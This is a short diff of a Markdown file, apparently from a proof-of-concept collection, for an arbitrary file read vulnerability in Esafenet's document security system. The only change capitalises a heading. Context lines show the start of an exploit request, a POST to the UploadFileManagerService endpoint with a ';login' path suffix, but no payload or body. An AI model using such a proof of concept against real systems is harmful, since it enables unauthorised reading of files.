@@ -1,6 +1,6 @@
 ## 亿赛通电子文档安全管理系统-UploadFileManagerService-任意文件读取漏洞
 
-## poc
+## POC
 ```
 POST /CDGServer3/document/UploadFileManagerService;login HTTP/1.1
 Host: 127.0.0.1
